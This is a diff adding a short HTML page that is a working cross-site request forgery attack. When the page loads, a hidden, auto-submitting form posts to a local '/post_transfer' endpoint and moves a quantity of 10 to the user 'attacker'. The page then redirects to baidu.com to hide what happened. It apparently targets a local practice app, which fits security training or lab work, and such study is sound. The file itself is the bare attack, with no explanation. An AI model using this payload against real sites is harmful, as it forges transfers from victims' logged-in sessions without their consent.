@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    
+    <form action="http://localhost:3000/post_transfer" method="post" enctype="application/x-www-form-urlencoded" id="pay">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value=10>
+    </form>
+
+    <script type="text/javascript">
+        function validate(){
+            document.getElementById("pay").submit();
+        }
+        window.load = validate();
+        setTimeout(function(){window.location = "http://baidu.com";}, 0.1);
+        </script>
+</body>
+</html>
